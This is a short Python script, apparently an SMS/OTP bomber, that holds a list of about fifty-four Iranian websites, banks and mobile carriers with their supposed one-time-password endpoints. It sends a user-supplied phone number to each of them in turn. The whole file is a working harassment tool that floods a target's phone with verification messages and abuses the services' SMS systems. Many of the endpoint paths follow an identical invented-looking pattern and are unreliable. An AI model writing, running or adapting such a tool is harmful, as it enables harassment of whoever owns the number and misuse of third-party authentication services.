import requests

# List of websites and OTP send paths
sites = [
    {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "param": "phone"},
    {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "param": "mobile"},
    {"name": "Digikala", "url": "https://api.digikala.com/v1/user/authenticate/", "param": "phone"},
    {"name": "Snapp", "url": "https://api.snapp.ir/v1/phone", "param": "phone"},
    {"name": "Tap30", "url": "https://api.tapsi.ir/v1/authenticate", "param": "phone"},
    {"name": "Aparat", "url": "https://www.aparat.com/api/authenticate", "param": "phone"},
    {"name": "CafeBazaar", "url": "https://api.cafebazaar.ir/v1/auth", "param": "phone"},
    {"name": "Namava", "url": "https://www.namava.ir/api/auth", "param": "mobile"},
    {"name": "Filimo", "url": "https://www.filimo.com/api/v1/verify", "param": "mobile"},
    {"name": "Pinket", "url": "https://api.pinket.com/api/v1/auth", "param": "phone"},
    {"name": "Jobinja", "url": "https://api.jobinja.ir/v1/auth", "param": "phone"},
    {"name": "E-Estekhdam", "url": "https://api.e-estekhdam.com/v1/authenticate", "param": "mobile"},
    {"name": "IranTalent", "url": "https://www.irantalent.com/api/v1/verify", "param": "phone"},
    {"name": "Mellat Bank", "url": "https://api.bankmellat.ir/v1/verify", "param": "phone"},
    {"name": "Melli Bank Iran", "url": "https://api.bmi.ir/v1/verify", "param": "mobile"},
    {"name": "Saderat Bank", "url": "https://www.bsi.ir/api/v1/verify", "param": "phone"},
    {"name": "Samman Bank", "url": "https://api.sb24.com/v1/auth", "param": "mobile"},
    {"name": "Pasargad Bank", "url": "https://www.bpi.ir/api/v1/verify", "param": "phone"},
    {"name": "Novin Bank", "url": "https://enbank.ir/api/v1/verify", "param": "phone"},
    {"name": "Ayandeh Bank", "url": "https://ba24.ir/api/v1/authenticate", "param": "mobile"},
    {"name": "Shahr Bank", "url": "https://shahr-bank.ir/api/v1/auth", "param": "phone"},
    {"name": "Deh Bank", "url": "https://day24.ir/api/v1/verify", "param": "mobile"},
    {"name": "Refah Bank", "url": "https://rb24.ir/api/v1/verify", "param": "phone"},
    {"name": "Maskan Bank", "url": "https://bank-maskan.ir/api/v1/verify", "param": "mobile"},
    {"name": "Agricultural Bank", "url": "https://agri-bank.ir/api/v1/authenticate", "param": "phone"},
    {"name": "Industry and Mine Bank", "url": "https://bim.ir/api/v1/verify", "param": "phone"},
    {"name": "Cooperation Bank", "url": "https://ttbank.ir/api/v1/verify", "param": "mobile"},
    {"name": "Karafarin Bank", "url": "https://karafarinbank.ir/api/v1/auth", "param": "phone"},
    {"name": "Sarmayeh Bank", "url": "https://sbank.ir/api/v1/verify", "param": "mobile"},
    {"name": "LinkedIn Farsi", "url": "https://linkedin.com/api/v1/verify", "param": "phone"},
    {"name": "Trendfull", "url": "https://trendfull.com/api/v1/authenticate", "param": "phone"},
    {"name": "Parsonline", "url": "https://parsonline.ir/api/v1/verify", "param": "phone"},
    {"name": "Irancell", "url": "https://irancell.ir/api/v1/verify", "param": "mobile"},
    {"name": "Hamrah Aval", "url": "https://hamraheaval.ir/api/v1/verify", "param": "phone"},
    {"name": "EasyPay", "url": "https://easypay.ir/api/v1/verify", "param": "phone"},
    {"name": "Rayaneh", "url": "https://rayaneh.ir/api/v1/authenticate", "param": "phone"},
    {"name": "Peyman", "url": "https://peyman.ir/api/v1/verify", "param": "mobile"},
    {"name": "Portal Software", "url": "https://portal.ir/api/v1/auth", "param": "phone"},
    {"name": "Pezeshkian", "url": "https://pezeshkian.com/api/v1/verify", "param": "phone"},
    {"name": "Bamilo", "url": "https://bamilo.com/api/v1/authenticate", "param": "phone"},
    {"name": "Uber Iran", "url": "https://uber.ir/api/v1/verify", "param": "mobile"},
    {"name": "Kish Air", "url": "https://kishairlines.ir/api/v1/authenticate", "param": "phone"},
    {"name": "Mehrabad Airport", "url": "https://mehrabad.airport.ir/api/v1/auth", "param": "phone"},
    {"name": "Iran Zamin Bank", "url": "https://izbank.ir/api/v1/verify", "param": "phone"},
    {"name": "Tanazesh Publishing", "url": "https://tanzhesh.ir/api/v1/verify", "param": "mobile"},
    {"name": "JobVision", "url": "https://jobvision.ir/api/v1/verify", "param": "phone"},
    {"name": "Business Startup", "url": "https://businessstartup.ir/api/v1/auth", "param": "phone"},
    {"name": "Tejarat News", "url": "https://tejaratnews.com/api/v1/verify", "param": "mobile"},
    {"name": "SnappFood", "url": "https://snappfood.ir/api/v1/auth", "param": "phone"},
    {"name": "Digistyle", "url": "https://digistyle.com/api/v1/verify", "param": "phone"},
    {"name": "PoshakOnline", "url": "https://poshakonline.ir/api/v1/authenticate", "param": "phone"},
    {"name": "Car Ir", "url": "https://car.ir/api/v1/verify", "param": "phone"},
    {"name": "Iran Startups", "url": "https://iranstartups.com/api/v1/auth", "param": "phone"},
    {"name": "Vitrinnet", "url": "https://vitrinnet.com/api/v1/verify", "param": "phone"},
]

# Asking the user for phone number input
phone_number = input("Please enter your phone number: ")

# Sending requests to all websites
for site in sites:
    try:
        response = requests.post(site["url"], json={site["param"]: phone_number})
        if response.status_code == 200:
            print(f"✅ OTP sent to {site['name']}.")
        else:
            print(f"❌ Error sending OTP to {site['name']}. Status code: {response.status_code}")
    except Exception as e:
        print(f"❌ Connection error to {site['name']}: {e}")